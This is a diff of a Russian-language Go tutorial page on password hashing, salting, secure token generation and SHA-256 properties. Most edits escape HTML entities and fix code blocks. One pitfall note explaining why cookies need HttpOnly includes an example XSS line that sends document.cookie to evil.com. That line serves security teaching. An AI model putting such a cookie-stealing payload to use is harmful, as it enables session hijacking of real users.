@@ -1371,7 +1371,7 @@ func main() {
 </ul>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">2.</span> <strong>Уязвимость к радужным таблицам (Rainbow Tables):</strong></div>
 <ul style="margin: 8px 0 8px 20px;">
-<li style="margin-bottom: 4px;">Если хэшировать пароль без соли, одинаковые пароли разных пользователей (<code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">"123456"</code>, <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">"password"</code>) дадут абсолютно идентичный хэш <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">e3b0c44298fc...</code>.</li>
+<li style="margin-bottom: 4px;">Если хэшировать пароль без соли, одинаковые пароли разных пользователей (<code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">&quot;123456&quot;</code>, <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">&quot;password&quot;</code>) дадут абсолютно идентичный хэш <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">e3b0c44298fc...</code>.</li>
 <li style="margin-bottom: 4px;">Злоумышленники заранее сгенерировали терабайтные базы данных (Rainbow Tables), где для каждого популярного MD5/SHA хэша предвычислен исходный пароль. Взлом происходит за одну операцию поиска по индексу (0.001 секунды).</li>
 </ul></div>
   </div>
@@ -1476,8 +1476,8 @@ func main() {
   </div>
   <div class="callout callout-pitfalls">
     <div class="callout-title">⚠️ Частые грабли и ошибки новичков</div>
-    <div><div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">1.</span> <strong>Иллюзия безопасности через множественный SHA-256:</strong> Некоторые разработчики пишут цикл: <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">for i := 0; i < 1000; i++ { pass = sha256(pass) }</code>. Это не спасает от специализированных FPGA/ASIC, так как алгоритм не требует памяти (memory-hardness = 0) и аппаратно конвейеризуется в микросхемах.</div>
-<div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">2.</span> <strong>Добавление статического префикса вместо случайной соли:</strong> Префикс <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">sha256("my_secret_prefix" + pass)</code> легко нивелируется после первой же утечки исходного кода.</div></div>
+    <div><div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">1.</span> <strong>Иллюзия безопасности через множественный SHA-256:</strong> Некоторые разработчики пишут цикл: <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">for i := 0; i &lt; 1000; i++ { pass = sha256(pass) }</code>. Это не спасает от специализированных FPGA/ASIC, так как алгоритм не требует памяти (memory-hardness = 0) и аппаратно конвейеризуется в микросхемах.</div>
+<div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">2.</span> <strong>Добавление статического префикса вместо случайной соли:</strong> Префикс <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">sha256(&quot;my_secret_prefix&quot; + pass)</code> легко нивелируется после первой же утечки исходного кода.</div></div>
   </div>
   <div class="callout callout-bigtech">
     <div class="callout-title">🏢 В продакшене BigTech и на собеседованиях</div>
@@ -1740,24 +1740,22 @@ func main() {
     <div class="callout-title">⚙️ Под капотом Go (Compiler, Linker & Runtime)</div>
     <div><p style="margin-bottom: 6px;">Почему <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">io.ReadFull</code> предпочтительнее простого <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">rand.Read</code>:</p>
 <p style="margin-bottom: 6px;">В стандартной библиотеке Go метод <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">rand.Read</code> реализован так:</p>
-<p style="margin-bottom: 6px;"><code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;"></code>`go</p>
-<p style="margin-bottom: 6px;">func Read(b []byte) (n int, err error) {</p>
-<p style="margin-bottom: 6px;">return io.ReadFull(Reader, b)</p>
-<p style="margin-bottom: 6px;">}</p>
-<p style="margin-bottom: 6px;"><code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;"></code>`</p>
+<div class="code-container" style="margin: 10px 0;"><pre class="language-go"><code class="language-go">func Read(b []byte) (n int, err error) {
+    return io.ReadFull(Reader, b)
+}</code></pre></div>
 <p style="margin-bottom: 6px;">Однако прямой вызов <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">io.ReadFull(rand.Reader, buf)</code> в собственном коде считается лучшей практикой по двум причинам:</p>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">1.</span> Он явно декларирует контракт полного чтения на уровне статического анализатора и линтера.</div>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">2.</span> В случае работы с пользовательскими реализациями <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">io.Reader</code> (например, аппаратный HSM-модуль через unix socket) гарантирует, что если ридер вернет меньше байт до EOF, вызов вернет ошибку <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">io.ErrUnexpectedEOF</code>, а не вернет частично заполненный массив нулей.</div></div>
   </div>
   <div class="callout callout-pitfalls">
     <div class="callout-title">⚠️ Частые грабли и ошибки новичков</div>
-    <div><div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">1.</span> <strong>Аллокация лишней памяти при форматировании:</strong> Использование <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">fmt.Sprintf("%x", buf)</code> вместо <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">hex.EncodeToString</code> или <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">base64.RawURLEncoding.EncodeToString</code> создает лишние аллокации интерфейсов <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">any</code> и замедляет высоконагруженные аутентификационные middleware.</div>
+    <div><div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">1.</span> <strong>Аллокация лишней памяти при форматировании:</strong> Использование <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">fmt.Sprintf(&quot;%x&quot;, buf)</code> вместо <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">hex.EncodeToString</code> или <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">base64.RawURLEncoding.EncodeToString</code> создает лишние аллокации интерфейсов <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">any</code> и замедляет высоконагруженные аутентификационные middleware.</div>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">2.</span> <strong>Использование стандартного Base64 вместо URLEncoding:</strong> Стандартный Base64 генерирует символы <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">+</code> и <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">/</code>. При передаче в GET-запросе веб-сервер распарсит <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">+</code> как пробел, и валидация токена завершится ошибкой 401 Unauthorized.</div></div>
   </div>
   <div class="callout callout-bigtech">
     <div class="callout-title">🏢 В продакшене BigTech и на собеседованиях</div>
     <div><p style="margin-bottom: 6px;"><strong>Вопрос с собеседования:</strong> Почему длина 16 байт (128 бит) считается абсолютным минимальным порогом для генерации криптографических идентификаторов сессий и токенов?</p>
-<p style="margin-bottom: 6px;"><strong>Ответ:</strong> Согласно парадоксу дней рождения (Birthday Paradox), вероятность возникновения коллизии достигает 50% при генерации $N \approx \sqrt{2^B} = 2^{B/2}$ случайных элементов. Для 128 бит энтропии порог коллизии составляет $2^{64} \approx 1.84 \times 10^{19}$ токенов. Даже если в распределенной системе генерируется 1 миллиард токенов в секунду, вероятность случайной коллизии между двумя пользователями за 100 лет пренебрежимо мала ($< 10^{-6}$). Использование 64-битных токенов (8 байт) снижает порог коллизий до $2^{32} \approx 4$ миллиардов, что в BigTech масштабах достигается за несколько недель.</p></div>
+<p style="margin-bottom: 6px;"><strong>Ответ:</strong> Согласно парадоксу дней рождения (Birthday Paradox), вероятность возникновения коллизии достигает 50% при генерации $N \approx \sqrt{2^B} = 2^{B/2}$ случайных элементов. Для 128 бит энтропии порог коллизии составляет $2^{64} \approx 1.84 \times 10^{19}$ токенов. Даже если в распределенной системе генерируется 1 миллиард токенов в секунду, вероятность случайной коллизии между двумя пользователями за 100 лет пренебрежимо мала ($&lt; 10^{-6}$). Использование 64-битных токенов (8 байт) снижает порог коллизий до $2^{32} \approx 4$ миллиардов, что в BigTech масштабах достигается за несколько недель.</p></div>
   </div>
 </div>
 <div class="exercise-card" id="ex-6">
@@ -1905,7 +1903,7 @@ func main() {
   </div>
   <div class="callout callout-pitfalls">
     <div class="callout-title">⚠️ Частые грабли и ошибки новичков</div>
-    <div><div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">1.</span> <strong>Отсутствие флага HttpOnly:</strong> Если Session ID передается в Cookie без <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">HttpOnly: true</code>, любая XSS-уязвимость (внедрение стороннего скрипта через баннеры или чат) позволит злоумышленнику украсть куку через <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">fetch('https://evil.com/steal?c=' + document.cookie)</code> и захватить сессию.</div>
+    <div><div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">1.</span> <strong>Отсутствие флага HttpOnly:</strong> Если Session ID передается в Cookie без <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">HttpOnly: true</code>, любая XSS-уязвимость (внедрение стороннего скрипта через баннеры или чат) позволит злоумышленнику украсть куку через <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">fetch(&#x27;https://evil.com/steal?c=&#x27; + document.cookie)</code> и захватить сессию.</div>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">2.</span> <strong>Сессионная фиксация (Session Fixation):</strong> Если при успешном логине пользователя старый анонимный Session ID не уничтожается, атакующий может заранее навязать жертве свой Session ID.</div></div>
   </div>
   <div class="callout callout-bigtech">
@@ -1921,7 +1919,7 @@ func main() {
   </div>
   <div class="callout callout-task">
     <div class="callout-title">📌 Условие задачи</div>
-    <div><p style="margin-bottom: 6px;"><strong>[Salt]</strong>: Добавь к паролю случайную "соль" (сгенерируй через <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">crypto/rand</code>). Объясни, как соль защищает от радужных таблиц.</p></div>
+    <div><p style="margin-bottom: 6px;"><strong>[Salt]</strong>: Добавь к паролю случайную &quot;соль&quot; (сгенерируй через <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">crypto/rand</code>). Объясни, как соль защищает от радужных таблиц.</p></div>
   </div>
   <div class="callout callout-theory">
     <div class="callout-title">💡 Теоретический фундамент и концепция</div>
@@ -1934,8 +1932,8 @@ func main() {
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">4.</span> В базе данных сохраняются <strong>и соль, и хэш</strong> (соль НЕ является секретом и хранится в открытом виде рядом с хэшем в таблице пользователей).</div>
 <div style="height: 8px;"></div>
 <p style="margin-bottom: 6px;">Как соль нейтрализует атаки:</p>
-<div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">1.</span> <strong>Уничтожение радужных таблиц (Rainbow Tables):</strong> Радужная таблица рассчитывается для чистых паролей (<code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">H("password")</code>). Если к каждому паролю примешана уникальная 128-битная соль, злоумышленнику придется пересчитывать радужную таблицу заново <strong>для каждого отдельного пользователя</strong>, что требует $2^{128}$ вариантов и полностью обесценивает предвычисления.</div>
-<div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">2.</span> <strong>Защита от параллельного взлома одинаковых паролей:</strong> Если 10 000 пользователей выбрали пароль <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">"qwerty"</code>, с солью у всех 10 000 будут абсолютно разные, непохожие хэши. Атакующему придется взламывать каждый хэш по отдельности.</div></div>
+<div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">1.</span> <strong>Уничтожение радужных таблиц (Rainbow Tables):</strong> Радужная таблица рассчитывается для чистых паролей (<code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">H(&quot;password&quot;)</code>). Если к каждому паролю примешана уникальная 128-битная соль, злоумышленнику придется пересчитывать радужную таблицу заново <strong>для каждого отдельного пользователя</strong>, что требует $2^{128}$ вариантов и полностью обесценивает предвычисления.</div>
+<div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">2.</span> <strong>Защита от параллельного взлома одинаковых паролей:</strong> Если 10 000 пользователей выбрали пароль <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">&quot;qwerty&quot;</code>, с солью у всех 10 000 будут абсолютно разные, непохожие хэши. Атакующему придется взламывать каждый хэш по отдельности.</div></div>
   </div>
   <div style="margin: 18px 0 10px;">
     <h4 style="color: #38bdf8; font-size: 1.05rem; margin-bottom: 8px; display: flex; align-items: center; gap: 6px;">
@@ -1943,7 +1941,7 @@ func main() {
     </h4>
     <div style="color: #cbd5e1; font-size: 0.94rem;"><div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">1.</span> Создайте функцию <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">GenerateSalt(length int) ([]byte, error)</code>.</div>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">2.</span> Реализуйте функцию хэширования с солью: <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">HashWithSalt(password string, salt []byte) []byte</code>.</div>
-<div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">3.</span> Создайте двух пользователей с одинаковым паролем <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">"SuperPassword2026!"</code>.</div>
+<div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">3.</span> Создайте двух пользователей с одинаковым паролем <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">&quot;SuperPassword2026!&quot;</code>.</div>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">4.</span> Сгенерируйте для каждого отдельную случайную соль.</div>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">5.</span> Убедитесь, что результирующие хэши полностью различаются.</div>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">6.</span> Напишите функцию верификации пароля по сохраненной соли и эталонному хэшу.</div></div>
@@ -2089,7 +2087,7 @@ func main() {
   </div>
   <div class="callout callout-task">
     <div class="callout-title">📌 Условие задачи</div>
-    <div><p style="margin-bottom: 6px;"><strong>Хэширование (SHA-256)</strong>: Хэшируй строку "my_password" с помощью <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">crypto/sha256</code>. Выведи результат в hex-формате. *Осознай, почему это КАТЕГОРИЧЕСКИ нельзя использовать для хранения паролей* (современная видеокарта переберет миллиарды SHA-256 хэшей за секунду).</p></div>
+    <div><p style="margin-bottom: 6px;"><strong>Хэширование (SHA-256)</strong>: Хэшируй строку &quot;my_password&quot; с помощью <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">crypto/sha256</code>. Выведи результат в hex-формате. *Осознай, почему это КАТЕГОРИЧЕСКИ нельзя использовать для хранения паролей* (современная видеокарта переберет миллиарды SHA-256 хэшей за секунду).</p></div>
   </div>
   <div class="callout callout-theory">
     <div class="callout-title">💡 Теоретический фундамент и концепция</div>
@@ -2111,9 +2109,9 @@ func main() {
     <h4 style="color: #38bdf8; font-size: 1.05rem; margin-bottom: 8px; display: flex; align-items: center; gap: 6px;">
       <span>🔍</span> Пошаговый ход решения и ход мысли инженера
     </h4>
-    <div style="color: #cbd5e1; font-size: 0.94rem;"><div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">1.</span> Подготовьте срез байт с исходным паролем <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">"my_password"</code>.</div>
+    <div style="color: #cbd5e1; font-size: 0.94rem;"><div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">1.</span> Подготовьте срез байт с исходным паролем <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">&quot;my_password&quot;</code>.</div>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">2.</span> Вычислите хэш SHA-256 с помощью <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">sha256.Sum256</code>.</div>
-<div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">3.</span> Закодируйте полученные 32 байта в шестнадцатеричную строку (hex) через <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">fmt.Sprintf("%x", ...)</code> или <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">hex.EncodeToString</code>.</div>
+<div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">3.</span> Закодируйте полученные 32 байта в шестнадцатеричную строку (hex) через <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">fmt.Sprintf(&quot;%x&quot;, ...)</code> или <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">hex.EncodeToString</code>.</div>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">4.</span> Сравните скорость вычисления SHA-256 со специализированным KDF.</div>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">5.</span> Продемонстрируйте необратимость хэша (попытка понять пароль по его хэшу невозможна аналитически).</div></div>
   </div>
@@ -2350,11 +2348,11 @@ func main() {
     <div><p style="margin-bottom: 6px;">Важнейшим свойством надежных криптографических хэш-функций и блочных шифров является <strong>лавинный эффект (Avalanche Effect)</strong>, сформулированный Хорстом Фейстелем в 1973 году.</p>
 <div style="height: 8px;"></div>
 <p style="margin-bottom: 6px;">Суть эффекта:</p>
-<p style="margin-bottom: 6px;">При изменении хотя бы одного бита во входных данных (например, смена символа <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">'0'</code> на <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">'1'</code> или регистра буквы), каждый бит выходного хэша должен измениться с вероятностью $50\%$.</p>
+<p style="margin-bottom: 6px;">При изменении хотя бы одного бита во входных данных (например, смена символа <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">&#x27;0&#x27;</code> на <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">&#x27;1&#x27;</code> или регистра буквы), каждый бит выходного хэша должен измениться с вероятностью $50\%$.</p>
 <div style="height: 8px;"></div>
 <p style="margin-bottom: 6px;">Строгий лавинный критерий (Strict Avalanche Criterion, SAC):</p>
-<p style="margin-bottom: 6px;">Если на вход подаются сообщения $M$ и $M'$, различающиеся ровно в одном бите, то расстояние Хэмминга между дайджестами $H = \text{SHA256}(M)$ и $H' = \text{SHA256}(M')$ должно подчиняться биномиальному распределению с математическим ожиданием:</p>
-<p style="margin-bottom: 6px;">$$E[\text{HammingDistance}(H, H')] = \frac{256}{2} = 128 \text{ бит}$$</p>
+<p style="margin-bottom: 6px;">Если на вход подаются сообщения $M$ и $M&#x27;$, различающиеся ровно в одном бите, то расстояние Хэмминга между дайджестами $H = \text{SHA256}(M)$ и $H&#x27; = \text{SHA256}(M&#x27;)$ должно подчиняться биномиальному распределению с математическим ожиданием:</p>
+<p style="margin-bottom: 6px;">$$E[\text{HammingDistance}(H, H&#x27;)] = \frac{256}{2} = 128 \text{ бит}$$</p>
 <div style="height: 8px;"></div>
 <p style="margin-bottom: 6px;">Если лавинный эффект не выполняется, функция считается криптографически сломанной, так как злоумышленник может использовать методы дифференциального криптоанализа для подбора коллизий.</p></div>
   </div>
@@ -2362,7 +2360,7 @@ func main() {
     <h4 style="color: #38bdf8; font-size: 1.05rem; margin-bottom: 8px; display: flex; align-items: center; gap: 6px;">
       <span>🔍</span> Пошаговый ход решения и ход мысли инженера
     </h4>
-    <div style="color: #cbd5e1; font-size: 0.94rem;"><div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">1.</span> Подготовьте две строки, различающиеся ровно одним символом (например, <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">"Transfer 1000 USD to Alice"</code> и <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">"Transfer 1001 USD to Alice"</code>).</div>
+    <div style="color: #cbd5e1; font-size: 0.94rem;"><div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">1.</span> Подготовьте две строки, различающиеся ровно одним символом (например, <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">&quot;Transfer 1000 USD to Alice&quot;</code> и <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">&quot;Transfer 1001 USD to Alice&quot;</code>).</div>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">2.</span> Вычислите SHA-256 дайджесты обеих строк.</div>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">3.</span> Напишите функцию подсчета расстояния Хэмминга (количество различающихся бит между двумя срезами байт).</div>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">4.</span> Продемонстрируйте, что при разнице всего в 1 бит на входе выходные 256-битные хэши различаются примерно на ~128 бит (около 50%).</div>
@@ -2459,7 +2457,7 @@ func main() {
   <div class="callout callout-pitfalls">
     <div class="callout-title">⚠️ Частые грабли и ошибки новичков</div>
     <div><div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">1.</span> <strong>Предположение о линейности хэша:</strong> Ошибочно полагать, что если $A$ и $B$ похожи, то их хэши будут иметь похожий префикс или суффикс. Хэши полностью некоррелированы.</div>
-<div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">2.</span> <strong>Аллокация срезов при подсчете расстояния Хэмминга:</strong> Использование преобразования в бинарную строку через <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">fmt.Sprintf("%08b", ...)</code> приводит к гигантскому числу аллокаций. Используйте оптимизированную функцию <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">math/bits.OnesCount8</code>.</div></div>
+<div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">2.</span> <strong>Аллокация срезов при подсчете расстояния Хэмминга:</strong> Использование преобразования в бинарную строку через <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">fmt.Sprintf(&quot;%08b&quot;, ...)</code> приводит к гигантскому числу аллокаций. Используйте оптимизированную функцию <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">math/bits.OnesCount8</code>.</div></div>
   </div>
   <div class="callout callout-bigtech">
     <div class="callout-title">🏢 В продакшене BigTech и на собеседованиях</div>
@@ -2481,15 +2479,13 @@ func main() {
     <div><p style="margin-bottom: 6px;">Загрузка больших файлов (образов дисков, архивов бэкапов на 10–100 ГБ) целиком в оперативную память через <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">os.ReadFile</code> или <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">io.ReadAll</code> мгновенно вызовет аварийное завершение процесса операционной системой по причине Out Of Memory (Linux OOM Killer).</p>
 <div style="height: 8px;"></div>
 <p style="margin-bottom: 6px;">В Go интерфейс хэш-функций <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">hash.Hash</code> реализует стандартный <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">io.Writer</code>:</p>
-<p style="margin-bottom: 6px;"><code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;"></code>`go</p>
-<p style="margin-bottom: 6px;">type Hash interface {</p>
-<p style="margin-bottom: 6px;">io.Writer</p>
-<p style="margin-bottom: 6px;">Sum(b []byte) []byte</p>
-<p style="margin-bottom: 6px;">Reset()</p>
-<p style="margin-bottom: 6px;">Size() int</p>
-<p style="margin-bottom: 6px;">BlockSize() int</p>
-<p style="margin-bottom: 6px;">}</p>
-<p style="margin-bottom: 6px;"><code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;"></code>`</p>
+<div class="code-container" style="margin: 10px 0;"><pre class="language-go"><code class="language-go">type Hash interface {
+    io.Writer
+    Sum(b []byte) []byte
+    Reset()
+    Size() int
+    BlockSize() int
+}</code></pre></div>
 <div style="height: 8px;"></div>
 <p style="margin-bottom: 6px;">Благодаря этому вычисление криптографического хэша любого файла произвольного объема выполняется потоково через <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">io.Copy(hasher, fileReader)</code>:</p>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">1.</span> <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">io.Copy</code> читает файл фиксированными чанками (буфер 32 КБ) и передает их в метод <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">hasher.Write(chunk)</code>.</div>
@@ -2614,12 +2610,10 @@ func main() {
     <div class="callout-title">🏢 В продакшене BigTech и на собеседованиях</div>
     <div><p style="margin-bottom: 6px;"><strong>Вопрос с собеседования:</strong> Как проверить целостность скачиваемого по HTTP 50-гигабайтного файла на лету, не сохраняя его на диск дважды и не загружая в оперативную память?</p>
 <p style="margin-bottom: 6px;"><strong>Ответ:</strong> Использовать связку <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">io.TeeReader</code> или кастомный <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">io.MultiWriter</code>. При чтении из <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">http.Response.Body</code>:</p>
